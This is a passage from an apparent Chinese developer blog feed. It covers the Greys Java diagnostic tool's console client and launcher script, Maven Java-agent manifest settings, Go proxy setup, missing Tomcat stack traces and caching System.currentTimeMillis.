\</span><br><span class="line">            com.github.ompc.greys.core.GreysConsole \</span><br><span class="line">                <span class="variable">$&#123;TARGET_IP&#125;</span> \</span><br><span class="line">                <span class="variable">$&#123;TARGET_PORT&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span> telnet 2&gt;&amp;1 &gt;&gt; /dev/null; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># use telnet</span></span><br><span class="line">        telnet <span class="variable">$&#123;TARGET_IP&#125;</span> <span class="variable">$&#123;TARGET_PORT&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span> nc 2&gt;&amp;1 &gt;&gt; /dev/null; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># use netcat</span></span><br><span class="line">        nc <span class="variable">$&#123;TARGET_IP&#125;</span> <span class="variable">$&#123;TARGET_PORT&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"'telnet' or 'nc' is required."</span> 1&gt;&amp;2</span><br><span class="line">        <span class="built_in">return</span> 1</span><br><span class="line"></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>active console</code>主要是启动一个客户端， 它对不同的方式做了判断; 以java方式启动的会执行<code>greys-core.jar</code>的<code>GreysConsole</code><br>的main方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String... args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> GreysConsole(<span class="keyword">new</span> InetSocketAddress(args[<span class="number">0</span>], Integer.valueOf(args[<span class="number">1</span>])));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>GreysConsole</code>的构造函数中连接到上面启动的<code>GaServer</code>， 将用户输入的命令发送到server端， 然后将server端的返回显示在交互式shell上。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.github.ompc.greys.core.GreysConsole#activeConsoleReader</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 发送命令到服务端</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">activeConsoleReader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Thread socketThread = <span class="keyword">new</span> Thread(<span class="string">"ga-console-reader-daemon"</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> StringBuilder lineBuffer = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (isRunning) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">final</span> String line = console.readLine();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 如果是\结尾，则说明还有下文，需要对换行做特殊处理</span></span><br><span class="line">                    <span class="keyword">if</span> (StringUtils.endsWith(line, <span class="string">"\\"</span>)) &#123;</span><br><span class="line">                        <span class="comment">// 去掉结尾的\</span></span><br><span class="line">                        lineBuffer.append(line.substring(<span class="number">0</span>, line.length() - <span class="number">1</span>));</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        lineBuffer.append(line);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">final</span> String lineForWrite = lineBuffer.toString();</span><br><span class="line">                    lineBuffer = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// replace ! to \!</span></span><br><span class="line">                    <span class="comment">// history.add(StringUtils.replace(lineForWrite, "!", "\\!"));</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// flush if need</span></span><br><span class="line">                    <span class="keyword">if</span> (history <span class="keyword">instanceof</span> Flushable) &#123;</span><br><span class="line">                        ((Flushable) history).flush();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    console.setPrompt(EMPTY);</span><br><span class="line">                    <span class="keyword">if</span> (isNotBlank(lineForWrite)) &#123;</span><br><span class="line">                        socketWriter.write(lineForWrite + <span class="string">"\n"</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        socketWriter.write(<span class="string">"\n"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    socketWriter.flush();</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                err(<span class="string">"read fail : %s"</span>, e.getMessage());</span><br><span class="line">                shutdown();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line">    socketThread.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">    socketThread.start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// com.github.ompc.greys.core.GreysConsole#loopForWriter</span></span><br><span class="line"><span class="comment">// 将服务端返回输出到界面</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">loopForWriter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (isRunning) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> c = socketReader.read();</span><br><span class="line">            <span class="keyword">if</span> (c == EOF) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (c == EOT) &#123;</span><br><span class="line">                hackingForReDrawPrompt();</span><br><span class="line">                console.setPrompt(DEFAULT_PROMPT);</span><br><span class="line">                console.redrawLine();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                out.write(c);</span><br><span class="line">            &#125;</span><br><span class="line">            out.flush();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        err(<span class="string">"write fail : %s"</span>, e.getMessage());</span><br><span class="line">        shutdown();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="使用maven生成MainFest文件"><a href="#使用maven生成MainFest文件" class="headerlink" title="使用maven生成MainFest文件"></a>使用maven生成MainFest文件</h2><h3 id="maven-jar-plugin"><a href="#maven-jar-plugin" class="headerlink" title="maven-jar-plugin"></a>maven-jar-plugin</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>qtracer-agent<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                       <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                           <span class="tag">&lt;<span class="name">Premain-Class</span>&gt;</span>qunar.tc.qtracer.instrument.AgentMain<span class="tag">&lt;/<span class="name">Premain-Class</span>&gt;</span></span><br><span class="line">                           <span class="tag">&lt;<span class="name">Agent-Class</span>&gt;</span>qunar.tc.qtracer.instrument.AgentMain<span class="tag">&lt;/<span class="name">Agent-Class</span>&gt;</span></span><br><span class="line">                           <span class="tag">&lt;<span class="name">Can-Redefine-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Redefine-Classes</span>&gt;</span></span><br><span class="line">                           <span class="tag">&lt;<span class="name">Can-Retransform-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Retransform-Classes</span>&gt;</span></span><br><span class="line">                       <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="maven-assembly-plugin"><a href="#maven-assembly-plugin" class="headerlink" title="maven-assembly-plugin"></a>maven-assembly-plugin</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Premain-Class</span>&gt;</span>**.**.InstrumentTest<span class="tag">&lt;/<span class="name">Premain-Class</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Agent-Class</span>&gt;</span>**.**..InstrumentTest<span class="tag">&lt;/<span class="name">Agent-Class</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Can-Redefine-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Redefine-Classes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Can-Retransform-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Retransform-Classes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://unix.stackexchange.com/questions/15740/how-to-specify-option-with-gnu-getopt" rel="external nofollow noopener noreferrer" target="_blank">bash - How to specify -? option with GNU getopt - Unix &amp; Linux Stack Exchange</a></li><li><a href="https://linux.die.net/man/3/getopt" rel="external nofollow noopener noreferrer" target="_blank">getopt(3): Parse options - Linux man page</a></li><li><a href="https://docs.oracle.com/javase/7/docs/jdk/api/attach/spec/com/sun/tools/attach/VirtualMachine.html" rel="external nofollow noopener noreferrer" target="_blank">VirtualMachine (Attach API )</a></li><li><a href="http://www.fanyilun.me/2017/07/18/%E8%B0%88%E8%B0%88Java%20Intrumentation%E5%92%8C%E7%9B%B8%E5%85%B3%E5%BA%94%E7%94%A8/" rel="external nofollow noopener noreferrer" target="_blank">谈谈Java Intrumentation和相关应用 | Yilun Fan’s Blog</a></li><li><a href="http://www.bijishequ.com/detail/435931?p=29-55" rel="external nofollow noopener noreferrer" target="_blank">Grays Anatomy源码浅析–ClassLoader,Java,Method,DES,null,方法,INVOKING</a></li><li><a href="https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html" rel="external nofollow noopener noreferrer" target="_blank">java.lang.instrument (Java Platform SE 8 )</a></li><li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-jse61/index.html" rel="external nofollow noopener noreferrer" target="_blank">Java SE 6 新特性: Instrumentation 新功能</a></li><li><a href="https://docs.oracle.com/javase/7/docs/platform/jvmti/jvmti.html#writingAgents" rel="external nofollow noopener noreferrer" target="_blank">JVM(TM) Tool Interface 1.2.1</a></li><li><a href="https://www.gitbook.com/book/sachin-handiekar/learning-jvmti/details" rel="external nofollow noopener noreferrer" target="_blank">Learning JVMTI · GitBook</a></li><li><a href="http://lovestblog.cn/blog/2014/06/18/jvm-attach/" rel="external nofollow noopener noreferrer" target="_blank">JVM Attach机制实现 - 你假笨</a></li><li><a href="https://www.slideshare.net/hongjiang/shelljava" rel="external nofollow noopener noreferrer" target="_blank">Shell,信号量以及java进程的退出</a></li><li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-jse63/" rel="external nofollow noopener noreferrer" target="_blank">Java SE 6 新特性: JMX 与系统管理</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;greys-简介&quot;&gt;&lt;a href=&quot;#greys-简介&quot; class=&quot;headerlink&quot; title=&quot;greys 简介&quot;&gt;&lt;/a&gt;greys 简介&lt;/h1&gt;&lt;p&gt;greys的使用参见链接： &lt;a href=&quot;/2017/11/12/greys/&quot; tit
      
    
    </summary>
    
      <category term="perf" scheme="http://qsli.github.io/categories/perf/"/>
    
    
      <category term="greys" scheme="http://qsli.github.io/tags/greys/"/>
    
  </entry>
  
  <entry>
    <title>Let&#39;s go!(Go语言学习)</title>
    <link href="http://qsli.github.io/2018/01/20/go-figure/"/>
    <id>http://qsli.github.io/2018/01/20/go-figure/</id>
    <published>2018-01-20T13:42:33.000Z</published>
    <updated>2018-08-11T12:42:41.476Z</updated>
    
    <content type="html"><![CDATA[<h2 id="go学习资料"><a href="#go学习资料" class="headerlink" title="go学习资料"></a>go学习资料</h2><h3 id="go-tutorial"><a href="#go-tutorial" class="headerlink" title="go tutorial"></a>go tutorial</h3><p><a href="https://tour.golang.org/list" rel="external nofollow noopener noreferrer" target="_blank">A Tour of Go</a></p><p>简单的语法介绍, 可以在线编译/运行</p><img src="/2018/01/20/go-figure/go-tour.png"><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="go-get访问被墙网站"><a href="#go-get访问被墙网站" class="headerlink" title="go get访问被墙网站"></a>go get访问被墙网站</h4><p>有些包只有墙外才能访问到, 因此第一步必须翻墙.</p><blockquote><p>另一个方法是实用 cow, 这是shadowsocks-go作者的另一个开发项目，根据项目介绍很容易的配置,可以在本机启动一个http代理，以shadowsocks为二级代理。</p></blockquote><p>补充一点, 用alias的方式, 可以只指定go使用代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">alias</span> go=<span class="string">'http_proxy=127.0.0.1:8080  https_proxy=127.0.0.1:8080 go'</span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><p><a href="http://colobu.com/2017/01/26/how-to-go-get-behind-GFW/" rel="external nofollow noopener noreferrer" target="_blank">如何在长城后面go get一些库 | 鸟窝</a></p></li><li><p><a href="https://tour.golang.org/list" rel="external nofollow noopener noreferrer" target="_blank">A Tour of Go</a></p></li><li><p><a href="https://stackoverflow.com/questions/10383299/how-do-i-configure-go-to-use-a-proxy" rel="external nofollow noopener noreferrer" target="_blank">How do I configure Go to use a proxy? - Stack Overflow</a></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;go学习资料&quot;&gt;&lt;a href=&quot;#go学习资料&quot; class=&quot;headerlink&quot; title=&quot;go学习资料&quot;&gt;&lt;/a&gt;go学习资料&lt;/h2&gt;&lt;h3 id=&quot;go-tutorial&quot;&gt;&lt;a href=&quot;#go-tutorial&quot; class=&quot;header
      
    
    </summary>
    
      <category term="go" scheme="http://qsli.github.io/categories/go/"/>
    
    
      <category term="go学习资料" scheme="http://qsli.github.io/tags/go%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat日志中异常堆栈不完整</title>
    <link href="http://qsli.github.io/2017/12/03/jvm-omit-fast-throw/"/>
    <id>http://qsli.github.io/2017/12/03/jvm-omit-fast-throw/</id>
    <published>2017-12-02T17:02:29.000Z</published>
    <updated>2018-08-11T12:42:42.147Z</updated>
    
    <content type="html"><![CDATA[<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>tomcat的异常日志会打印到<code>catalina.out</code>中，有的时候发现日志的堆栈并不完整， 只能看到部分的堆栈信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Exception: NullPointerException | 2390852_pd2390852_prc2390852_sr2390852_ncb2390852_pm45090051_pd45090051_prc45090051_sr45090051_ncb45090051_pm36619638_pd36619638_prc36619638_sr36619638_ncb36619638_pm1122394_pd1122394_prc1122394_sr1122394_ncb1122394_pm</span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">        at sun.reflect.GeneratedMethodAccessor481.invoke(Unknown Source) ~[na:na]</span><br><span class="line">        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_60]</span><br><span class="line">        at java.lang.reflect.Method.invoke(Method.java:497) ~[na:1.8.0_60]</span><br><span class="line">        at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:221) ~[spring-web-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:136) ~[spring-web-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:110) ~[spring-webmvc-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invoke</span><br><span class="line">java.lang.NullPointerException: null</span><br><span class="line">[2016-12-05 11:29:27][h_hprice_breeze_p_161205.112927.10.90.5.48.6486.595359_1][ESC[31mWARN ESC[0;39m]logX -&gt; desc = SHotel 状态无效, data = hotelId[</span><br></pre></td></tr></table></figure><p>可以看到这个<code>NPE</code>只打印了，一个message， 内部的堆栈都没有了，这样就无法根据堆栈信息找到对应的代码的位置。</p><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><h3 id="jvm的优化"><a href="#jvm的优化" class="headerlink" title="jvm的优化"></a>jvm的优化</h3><blockquote><p>HotSpot虚拟机的JIT优化，把多次打的堆栈给优化掉了，往上Grep应该能Grep到完整的堆栈。</p></blockquote><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>这种被优化调的堆栈，第一次都是打出来完整的，因此可以向上翻翻，应该是能找到完整的现场的。</p><p>频繁的打印异常的堆栈，对系统性能也有较大的影响，不过如果不是生产环境，可以在jvm的启动参数后面加上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX:-OmitStackTraceInFastThrow</span><br></pre></td></tr></table></figure><p>将这种优化主动关闭</p><h3 id="日志打的太快"><a href="#日志打的太快" class="headerlink" title="日志打的太快"></a>日志打的太快</h3><p>其实打到tomcat的<code>catalina.out</code>的应该是有两个日志框架，一个是tomcat自己带的，一个是应用的。</p><p>tomcat自己带了一个日志的框架 —— <code>juli</code></p><p>自己的应用中一般也会用一个日志的框架，比如 —— <code>logback</code></p><p>这样就存在同时写入<code>catalina.out</code>文件的可能，<code>juli</code>日志刚打了一半， 就被<code>logback</code>打的日志穿插了。<br>这样本来两行相邻的日志，就会差的十万八千里。</p><blockquote><p>Tomcat 的内部日志使用 JULI 组件，这是一个 Apache Commons 日志的重命名的打包分支，默认被硬编码，使用 java.util.logging 架构。<br>这能保证 Tomcat 内部日志与 Web 应用的日志保持独立，即使 Web 应用使用的是 Apache Commons Logging。</p></blockquote><p>正是这个独立性，导致了日志有可能是乱的。<br>tomcat加载内部的日志组件的加载器是<code>System class loader</code>，<br>应用的日志组件的类加载器是<code>webapp class loader</code>，因此即使用的是同一套日志体系，相互之间应该还是隔离的。</p><p>logback的官方文档也说明了：</p><blockquote><p>By virtue of class loader separation provided by the container,<br>each web-application will load its own copy of LoggerContext which will pickup its own copy of logback.xml.</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><p><a href="http://jawspeak.com/2010/05/26/hotspot-caused-exceptions-to-lose-their-stack-traces-in-production-and-the-fix/" rel="external nofollow noopener noreferrer" target="_blank">Hotspot caused exceptions to lose their stack traces in production – and the fix at JAW Speak</a></p></li><li><p><a href="http://rongmayisheng.com/post/%E8%AF%91%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E4%B8%AD%E5%BC%82%E5%B8%B8%E5%A0%86%E6%A0%88%E4%B8%A2%E5%A4%B1%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88" rel="external nofollow noopener noreferrer" target="_blank">[译]生产环境中异常堆栈丢失的解决方案 | 戎码一生</a></p></li><li><p><a href="http://wiki.jikexueyuan.com/project/tomcat/logging.html" rel="external nofollow noopener noreferrer" target="_blank">日志机制 - Tomcat 8 权威指南 - 极客学院Wiki</a></p></li><li><p><a href="https://logback.qos.ch/manual/loggingSeparation.html" rel="external nofollow noopener noreferrer" target="_blank">Chapter 9: Logging separation</a></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;现象&quot;&gt;&lt;a href=&quot;#现象&quot; class=&quot;headerlink&quot; title=&quot;现象&quot;&gt;&lt;/a&gt;现象&lt;/h2&gt;&lt;p&gt;tomcat的异常日志会打印到&lt;code&gt;catalina.out&lt;/code&gt;中，有的时候发现日志的堆栈并不完整， 只能看到部分的堆栈信息
      
    
    </summary>
    
      <category term="tomcat" scheme="http://qsli.github.io/categories/tomcat/"/>
    
    
      <category term="tomcat" scheme="http://qsli.github.io/tags/tomcat/"/>
    
  </entry>
  
  <entry>
    <title>缓存System.currentTimeMillis的调用</title>
    <link href="http://qsli.github.io/2017/12/02/cache-system-time/"/>
    <id>http://qsli.github.io/2017/12/02/cache-system-time/</id>
    <published>2017-12-02T14:16:31.000Z</published>
    <updated>2018-08-11T12:42:41.154Z</updated>
    
    <content type="html"><![CDATA[<h2 id="系统时间缓存的必要"><a href="#系统时间缓存的必要" class="headerlink" title="系统时间缓存的必要"></a>系统时间缓存的必要</h2><img src="/2017/12/02/cache-system-time/time-cache.jpg"><p>除了网络服务器，监控系统和日志系统也会频繁的调用<code>System.currentTimeMillis</code>。看公<br>司内部实现的异步日志中就对系统时间进行了缓存。</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><script src="//gist.github.com/a42cea0411b2cff131f34d82d030115b.js"></script><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>使用<code>JMH</code>做一个<code>benchmark</code>压力测试， <code>JMH</code>在做测试之前会有预热的过程，以排<br>除<code>jit</code>等因素的影响，在系统达到稳定运行的时候再去对比两个方法的调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RunnerException </span>&#123;</span><br><span class="line">Options opt = <span class="keyword">new</span> OptionsBuilder()</span><br><span class="line">               .include(CurrentTimeMillions.class.getSimpleName())</span><br><span class="line">               .mode(Mode.AverageTime)</span><br><span class="line">               .measurementIterations(<span class="number">2000</span>)</span><br><span class="line">               .forks(<span class="number">1</span>)</span><br><span class="line">               .build();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">new</span> Runner(opt).run();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># Run complete. Total time: 01:07:53</span><br><span class="line"></span><br><span class="line">Benchmark                            Mode   Cnt   Score     Error  Units</span><br><span class="line">CurrentTimeMillions.test             avgt  2000  ≈ 10⁻⁸             s/op</span><br><span class="line">CurrentTimeMillions.testSystemTimer  avgt  2000  ≈ 10⁻⁹             s/op</span><br></pre></td></tr></table></figure><p>可以看到还是差了一个数量级，如果对时间的精度要求没有那么高，还是可以缓存下的。</p><h2 id="查看调用的系统方法"><a href="#查看调用的系统方法" class="headerlink" title="查看调用的系统方法"></a>查看调用的系统方法</h2><p>使用<code>strace</code>attach 到当前的进程，查看进程相应的调用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo strace -p  [pid]</span><br></pre></td></tr></table></figure><p>输出结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜ sudo strace -p 15588</span><br><span class="line">strace: Process 15588 attached</span><br><span class="line">futex(0x7f8c175f99d0, FUTEX_WAIT, 15589, NULL</span><br></pre></td></tr></table></figure><p>并没有看到具体的系统调用，查找原因发现：</p><blockquote><p>这里使用 ltrace 是因为 linux 支持 VDSO 之后，gettimeofday 属于快速系统调用，使<br>用 strace 是看不到执行结果的。</p></blockquote><blockquote><p>What is actually happening here is that we are linking to the vDSO (virtual<br>dynamic shared object), which is a small fully relocatable shared library<br>pre-mapped into the user address space. The linking happens during the first<br>call of gettimeofday, after which the call is resolved, and 